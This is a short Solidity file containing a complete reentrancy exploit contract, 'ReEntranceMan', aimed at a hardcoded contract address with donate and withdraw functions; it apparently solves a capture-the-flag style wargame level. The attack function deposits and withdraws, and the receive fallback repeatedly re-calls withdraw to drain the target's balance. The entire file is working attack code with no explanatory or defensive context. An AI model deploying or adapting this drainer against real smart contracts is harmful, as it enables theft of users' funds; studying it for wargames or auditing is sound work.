pragma solidity ^0.8;

interface IReentrance {
    function donate(address _to) external payable;

    function withdraw(uint256 _amount) external;
}

contract ReEntranceMan {
    uint256 amt;
    IReentrance target =
        IReentrance(0x86973072c58B748860B48c1435fDa6Be5e697015);

    function attack() external payable {
        amt = msg.value;
        target.donate{value: amt}(address(this));
        target.withdraw(amt);
    }

    receive() external payable {
        if (address(target).balance >= amt) {
            // call withdraw at the bank again...
            target.withdraw(amt);
        }
    }
}
